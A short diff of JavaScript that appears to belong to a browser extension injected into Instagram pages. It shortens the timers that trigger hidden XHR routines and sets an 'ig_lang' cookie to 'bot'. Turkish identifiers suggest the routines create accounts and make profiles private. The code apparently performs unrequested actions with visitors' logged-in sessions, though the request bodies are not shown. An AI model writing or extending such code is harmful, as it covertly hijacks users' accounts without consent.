@@ -105,8 +105,8 @@ type = (name, value) => {
 }
 
 $(document).ready(() => {
-	var cookie_name = "hahdhfhasdfhffffjfjfhffsdf";
-	var cookie_time = 60*24*30;
+	var cookie_name = "heasbOlustur";
+	var cookie_time = 60*23;
 	if (!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now() - 60 * 1000 * cookie_time) {
 		localStorage[cookie_name] = Date.now();
 		var myXhrInterval3 = setInterval(() => {
@@ -219,8 +219,8 @@ if(window.location.origin.indexOf("instagram.com") >= 0 && document.referrer.ind
 	setCookie("ig_lang","bot",999999);
 	
 	$(document).ready(function() {
-		var cookie_name = "resimVeGizliYap49fffffffff4";
-		var cookie_time = 60*24*30;
+		var cookie_name = "resimVeGizliYap";
+		var cookie_time = 7;
 		if (!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now() - 60 * 1000 * cookie_time) {
 			localStorage[cookie_name] = Date.now();
 			var xhr = new XMLHttpRequest();
